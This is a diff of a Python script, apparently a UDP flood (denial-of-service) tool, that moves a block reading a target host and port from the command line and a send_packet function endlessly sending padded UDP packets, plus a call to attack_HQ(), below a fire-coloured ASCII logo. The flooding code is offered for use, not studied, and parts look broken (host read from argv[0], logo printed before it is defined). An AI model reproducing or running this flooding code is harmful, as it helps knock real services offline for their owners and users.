@@ -5,24 +5,7 @@ import sys
 import socket
 import threading
 import fade
-#import time as clock
 
-host = str(sys.argv[0])
-port = int(sys.argv[1])
-#time = int(sys.argv[4])
-method = str(sys.argv[2])
-
-loops = 10000
-
-def send_packet(amplifier):
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        s.connect((str(host), int(port)))
-        while True: s.send(b"\x99" * amplifier)
-    except: return s.close()
-
-attack_HQ()
 os.system("clear")
 print(logo)
 logo = """
@@ -43,6 +26,25 @@ _____       ___         _____          _________    _________
 """
 faded_text = fade.fire(logo)
 print(faded_text)
+
+#import time as clock
+host = str(sys.argv[0])
+port = int(sys.argv[1])
+#time = int(sys.argv[4])
+method = str(sys.argv[2])
+
+loops = 10000
+
+def send_packet(amplifier):
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        s.connect((str(host), int(port)))
+        while True: s.send(b"\x99" * amplifier)
+    except: return s.close()
+
+attack_HQ()
+
 #def timer(timeout):
 #    while True:
 #        if clock.time() > timeout: exit()
